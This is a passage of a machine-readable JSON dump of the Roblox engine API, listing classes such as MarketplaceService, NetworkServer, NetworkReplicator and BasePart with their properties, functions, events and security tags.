LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["RobloxPlaceSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"3000"}],"Name":"Disconnect","tags":["LocalUserSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"string","Name":"server","Default":null},{"Type":"int","Name":"serverPort","Default":null},{"Type":"int","Name":"clientPort","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"30"}],"Name":"PlayerConnect","tags":["PluginSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"gameSessionID","Default":null}],"Name":"SetGameSessionID","tags":["RobloxSecurity"],"Class":"NetworkClient","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkClient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsCloudEditServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsTeamTestServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetIsPlayerAuthenticationRequired","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"port","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"20"}],"Name":"Start","tags":["PluginSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"1000"}],"Name":"Stop","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataBasicFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataCustomFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"IncommingConnection","tags":["RobloxScriptSecurity"],"Class":"NetworkServer","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"MachineAddress","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ValueType":"int","type":"Property","Name":"Port","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"DisableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestCharacter","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"SendMarker","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetPropSyncExpiration","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"lostConnection","Type":"bool"}],"Name":"Disconnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"PreventTerrainChanges","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBasicFilteringEnabled","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"isAuthenticated","Type":"bool"},{"Name":"protocolVersion","Type":"int"}],"Name":"TicketProcessed","tags":[],"Class":"ServerReplicator","type":"Event"},{"ReturnType":"FilterResult","Arguments":[{"Name":"deletingItem","Type":"Instance"}],"Name":"DeleteFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"firingItem","Type":"Instance"},{"Name":"event","Type":"string"}],"Name":"EventFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"newItem","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"NewFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"changingItem","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"value","Type":"Variant"}],"Name":"PropertyFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryPoolMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowPartMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"TotalNumMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["deprecated"],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"